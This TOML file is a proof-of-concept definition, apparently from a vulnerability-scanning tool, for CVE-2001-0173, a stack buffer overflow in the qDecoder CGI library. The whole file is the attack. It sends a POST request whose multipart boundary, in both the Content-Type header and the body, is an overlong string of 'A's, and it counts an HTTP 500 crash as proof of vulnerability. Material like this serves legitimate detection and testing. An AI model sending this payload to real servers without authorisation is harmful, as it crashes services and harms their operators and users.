[info]
author = "ave"
description = "验证 qDecoder 库（4.0~5.0.8）缓冲区溢出漏洞。通过 POST 请求发送超长 Content-Type multipart/form-data boundary 参数（>254 字符），触发 qDecoder 栈溢出导致 CGI 程序崩溃（HTTP 500 响应或无响应）。"
id = "POC-AVE-2001-0067"
name = "CVE-2001-0173 PoC"
severity = "critical"
tags = ["cve-2001-0173"]
vuln_id = [
    "CVE-2001-0173",
    "AVE-2001-0067",
]

[poc]
logic = "any"

[[poc.requests]]
method = "POST"
path = "/cgi-bin/vulnerable.cgi"
protocol = "http"

[poc.requests.body]
content = """
--AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA--\r
"""
type = "raw"

[poc.requests.headers]
Content-Type = "multipart/form-data; boundary=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"

[[poc.requests.matchers]]
expect = true
status = [500]
type = "status"
